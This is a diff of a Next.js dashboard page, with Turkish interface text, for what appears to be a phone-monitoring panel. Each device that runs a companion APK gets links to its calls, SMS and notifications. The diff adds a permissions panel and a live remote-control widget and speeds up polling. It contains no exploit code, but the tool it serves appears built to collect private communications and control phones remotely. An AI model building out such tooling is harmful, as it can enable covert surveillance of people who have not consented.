@@ -4,6 +4,8 @@ import { useEffect, useState } from 'react';
 import { api, Device, isOnline, formatDate } from '@/lib/api';
 import Link from 'next/link';
 import { LoadingSkeleton } from '@/components/ui/LoadingSkeleton';
+import { PermissionPanel } from '@/components/PermissionPanel';
+import { LiveControl } from '@/components/LiveControl';
 
 export default function DashboardPage() {
   const [devices, setDevices] = useState<Device[]>([]);
@@ -27,7 +29,7 @@ export default function DashboardPage() {
 
   useEffect(() => {
     load();
-    const t = setInterval(() => load(true), 30_000);
+    const t = setInterval(() => load(true), 15_000);
     return () => clearInterval(t);
   }, []);
 
@@ -36,7 +38,7 @@ export default function DashboardPage() {
       <div className="page-header">
         <div>
           <h1 className="page-title">Ana Sayfa</h1>
-          <p className="page-subtitle">Bağlı cihazlar ve hızlı erişim</p>
+          <p className="page-subtitle">Cihazlar, izinler ve canlı kontrol</p>
         </div>
         <button type="button" onClick={() => load(true)} className="btn-secondary text-sm" disabled={refreshing}>
           {refreshing ? '↻ Güncelleniyor...' : '↻ Yenile'}
@@ -53,22 +55,34 @@ export default function DashboardPage() {
           <p>APK kurulumunda panel adresi ve bu hesabın e-postasını girin.</p>
         </div>
       ) : (
-        <div className="grid gap-4 sm:grid-cols-2 xl:grid-cols-3">
+        <div className="space-y-6">
           {devices.map((device) => (
             <div key={device.id} className="data-card">
-              <div className="flex items-start justify-between mb-4 gap-2">
+              <div className="flex items-start justify-between gap-2 mb-2">
                 <div className="min-w-0">
-                  <h3 className="font-semibold truncate">{device.deviceName}</h3>
-                  <p className="text-sm text-gray-500">v{device.apkVersion}</p>
+                  <h3 className="font-semibold text-lg truncate">{device.deviceName}</h3>
+                  <p className="text-sm text-gray-500">
+                    {device.manufacturer && device.model
+                      ? `${device.manufacturer} ${device.model}`
+                      : 'Model bilgisi bekleniyor'}
+                    {' · '}v{device.apkVersion}
+                  </p>
                 </div>
                 <span className={isOnline(device.lastSeen) ? 'badge-green' : 'badge-gray'}>
                   {isOnline(device.lastSeen) ? 'Çevrimiçi' : 'Çevrimdışı'}
                 </span>
               </div>
-              <p className="text-sm text-gray-500 mb-4">
+              <p className="text-sm text-gray-500 mb-2">
                 Son görülme: {device.lastSeen ? formatDate(device.lastSeen) : 'Hiç'}
               </p>
-              <div className="grid grid-cols-2 gap-2">
+
+              <PermissionPanel device={device} />
+
+              <div className="mt-4">
+                <LiveControl deviceId={device.id} online={isOnline(device.lastSeen)} />
+              </div>
+
+              <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 mt-4">
                 <Link href={`/dashboard/calls?device=${device.id}`} className="btn-secondary text-xs text-center">Aramalar</Link>
                 <Link href={`/dashboard/sms?device=${device.id}`} className="btn-secondary text-xs text-center">SMS</Link>
                 <Link href={`/dashboard/notifications?device=${device.id}`} className="btn-secondary text-xs text-center">Bildirimler</Link>
